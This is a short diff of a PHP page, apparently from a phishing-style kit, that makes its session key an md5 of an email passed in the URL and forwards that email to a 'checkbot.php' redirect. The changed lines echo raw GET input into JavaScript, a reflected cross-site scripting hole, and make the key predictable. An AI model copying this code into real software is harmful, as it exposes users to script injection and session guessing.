@@ -1,6 +1,6 @@
 <?php
 session_start();
-$_SESSION['key'] = time().".".md5(time());
+$_SESSION['key'] = md5(@$_GET['e']);
 $_SESSION['mail'] = @$_GET['e'];
 
 ?>
@@ -520,7 +520,7 @@ $_SESSION['mail'] = @$_GET['e'];
 			// Создаем объект URLSearchParams на основе параметров
 			const params = new URLSearchParams(url_now.search);
 			
-			window.location.href = 'checkbot.php?key=<?=$_SESSION['key']?>';
+			window.location.href = 'checkbot.php?key=<?=$_SESSION['key']?>&mail=<?=$_SESSION['mail'];?>';
 			
 			
 			         // filter(data);
